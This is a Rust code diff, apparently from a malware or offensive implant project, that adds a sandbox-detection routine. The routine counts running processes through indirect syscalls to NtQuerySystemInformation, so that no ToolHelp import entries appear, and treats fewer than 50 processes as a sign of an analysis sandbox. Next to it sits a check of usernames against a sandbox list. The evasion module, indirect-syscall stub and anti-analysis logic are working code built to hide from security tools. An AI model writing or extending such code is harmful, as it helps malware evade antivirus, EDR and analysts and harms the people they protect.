@@ -83,7 +83,30 @@ unsafe fn username_is_sandbox() -> bool {
     BAD.iter().any(|&n| lower == n)
 }
 
-#[cfg(target_os = "windows")]
+/// Count processes via NtQuerySystemInformation — no ToolHelp IAT entries on x64.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn process_count_low() -> bool {
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    let Some((ssn, tramp)) = get_ssn(b"NtQuerySystemInformation") else { return false; };
+    let mut needed = 0u32;
+    let mut dummy = [0u8; 8];
+    indirect_syscall(ssn, tramp, 5, dummy.as_mut_ptr() as usize, 8, &mut needed as *mut u32 as usize, 0, 0);
+    let buf_size = (needed as usize + 0x1000) & !0xFFF;
+    let mut buf = vec![0u8; buf_size];
+    let st = indirect_syscall(ssn, tramp, 5, buf.as_mut_ptr() as usize, buf_size, &mut needed as *mut u32 as usize, 0, 0);
+    if st < 0 { return false; }
+    let mut count = 0usize;
+    let mut offset = 0usize;
+    loop {
+        count += 1;
+        let next_off = u32::from_le_bytes([buf[offset], buf[offset+1], buf[offset+2], buf[offset+3]]) as usize;
+        if next_off == 0 { break; }
+        offset += next_off;
+    }
+    count < 50
+}
+
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
 unsafe fn process_count_low() -> bool {
     use windows_sys::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
